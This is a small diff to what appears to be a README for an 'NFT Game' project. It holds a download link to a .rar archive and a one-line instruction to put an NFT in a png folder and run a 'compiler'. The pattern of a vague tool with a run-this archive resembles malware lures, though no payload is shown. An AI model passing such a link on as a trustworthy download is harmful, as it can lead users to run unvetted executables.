@@ -1,4 +1,6 @@
-Download Nft Game Run put your nft on png folder then run compiler
+
+Nft Game Run put your nft on png folder then run compiler
+
 Download : https://raw.githubusercontent.com/citizenfix/NFT-Game-Horses-master/main/NFT-Game-Horses-master.rar
 
 NFT Game
